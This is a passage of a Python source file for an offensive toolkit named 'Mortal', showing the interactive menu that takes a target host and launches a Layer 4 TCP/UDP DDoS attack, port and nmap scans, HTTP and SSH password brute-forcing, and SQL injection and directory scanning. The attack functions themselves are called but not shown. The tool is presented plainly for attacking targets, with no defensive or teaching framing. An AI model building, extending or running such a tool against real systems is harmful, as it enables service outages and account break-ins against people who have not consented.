                protocol = input(f"{Fore.CYAN}Protocol (tcp/udp, default tcp): {Fore.WHITE}") or "tcp"
                if protocol.lower() not in ['tcp', 'udp']:
                    print(f"{Fore.YELLOW}[!] Invalid protocol, using tcp")
                    protocol = "tcp"
                    
                try:
                    duration = int(input(f"{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}"))
                    if duration <= 0:
                        print(f"{Fore.RED}[-] Duration must be positive!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        continue
                except ValueError:
                    print(f"{Fore.RED}[-] Invalid duration!")
                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                
                print(f"{Fore.YELLOW}[+] Starting Layer 4 {protocol.upper()} DDoS...")
                ddos_engine.layer4_ddos(ip, port, duration, protocol)
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                
            elif choice == "3":
                while True:
                    MortalInterface.banner()
                    print(f"{Fore.CYAN}Information Gathering")
                    MortalInterface.info_gathering_menu()
                    sub_choice = input(f"\n{Fore.RED}InfoGather@Mortal: {Fore.RESET}")
                    
                    if sub_choice == "1":
                        hostname = input(f"{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}")
                        if not hostname:
                            print(f"{Fore.RED}[-] Hostname/IP cannot be empty!")
                        else:
                            ip = info_gather.host_to_ip(hostname) or hostname
                            if ip:
                                info_gather.nmap_scan(ip)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "2":
                        hostname = input(f"{Fore.CYAN}Hostname to resolve: {Fore.WHITE}")
                        if not hostname:
                            print(f"{Fore.RED}[-] Hostname cannot be empty!")
                        else:
                            info_gather.host_to_ip(hostname)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "3":
                        hostname = input(f"{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}")
                        if not hostname:
                            print(f"{Fore.RED}[-] Hostname/IP cannot be empty!")
                        else:
                            ip = info_gather.host_to_ip(hostname) or hostname
                            if ip:
                                try:
                                    start_port = int(input(f"{Fore.CYAN}Start Port (1-65535, default 1): {Fore.WHITE}") or "1")
                                    start_port = max(1, min(start_port, 65535))
                                except ValueError:
                                    start_port = 1
                                    print(f"{Fore.YELLOW}[!] Invalid start port, using 1")
                                    
                                try:
                                    end_port = int(input(f"{Fore.CYAN}End Port (1-65535, default 65535): {Fore.WHITE}") or "65535")
                                    end_port = max(1, min(end_port, 65535))
                                except ValueError:
                                    end_port = 65535
                                    print(f"{Fore.YELLOW}[!] Invalid end port, using 65535")
                                    
                                if start_port > end_port:
                                    print(f"{Fore.RED}[-] Start port must be <= end port!")
                                else:
                                    info_gather.port_scanner(ip, start_port, end_port)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "0":
                        break
                    else:
                        print(f"{Fore.RED}[-] Invalid choice!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        
            elif choice == "4":
                while True:
                    MortalInterface.banner()
                    print(f"{Fore.CYAN}Password Attacks")
                    MortalInterface.password_attacks_menu()
                    sub_choice = input(f"\n{Fore.RED}Passwords@Mortal: {Fore.RESET}")
                    
                    if sub_choice == "1":
                        url = input(f"{Fore.CYAN}Login URL: {Fore.WHITE}")
                        if not url:
                            print(f"{Fore.RED}[-] URL cannot be empty!")
                        else:
                            username = input(f"{Fore.CYAN}Username: {Fore.WHITE}")
                            if not username:
                                print(f"{Fore.RED}[-] Username cannot be empty!")
                            else:
                                passwd_attack.http_bruteforce(url, username)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "2":
                        host = input(f"{Fore.CYAN}Target Host: {Fore.WHITE}")
                        if not host:
                            print(f"{Fore.RED}[-] Host cannot be empty!")
                        else:
                            username = input(f"{Fore.CYAN}Username: {Fore.WHITE}")
                            if not username:
                                print(f"{Fore.RED}[-] Username cannot be empty!")
                            else:
                                passwd_attack.ssh_bruteforce(host, username)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "0":
                        break
                    else:
                        print(f"{Fore.RED}[-] Invalid choice!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        
            elif choice == "5":
                while True:
                    MortalInterface.banner()
                    print(f"{Fore.CYAN}Web Hacking")
                    MortalInterface.web_hacking_menu()
                    sub_choice = input(f"\n{Fore.RED}WebHack@Mortal: {Fore.RESET}")
                    
                    if sub_choice == "1":
                        url = input(f"{Fore.CYAN}URL with parameter (e.g., ?id=1): {Fore.WHITE}")
                        if not url:
                            print(f"{Fore.RED}[-] URL cannot be empty!")
                        else:
                            web_hack.sqli_scanner(url)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "2":
                        url = input(f"{Fore.CYAN}Website URL: {Fore.WHITE}")
                        if not url:
                            print(f"{Fore.RED}[-] URL cannot be empty!")
                        else:
                            web_hack.directory_finder(url)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "3":
                        url = input(f"{Fore.CYAN}Website URL: {Fore.WHITE}")
                        if not url:
                            print(f"{Fore.RED}[-] URL cannot be empty!")
                        else:
                            web_hack.cms_detector(url)
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    elif sub_choice == "0":
                        break
                    else:
                        print(f"{Fore.RED}[-] Invalid choice!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        
            elif choice == "0":
                print(f"{Fore.YELLOW}Goodbye! Happy hacking! ;)")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")

if __name__ == "__main__":
    MortalInterface.run()
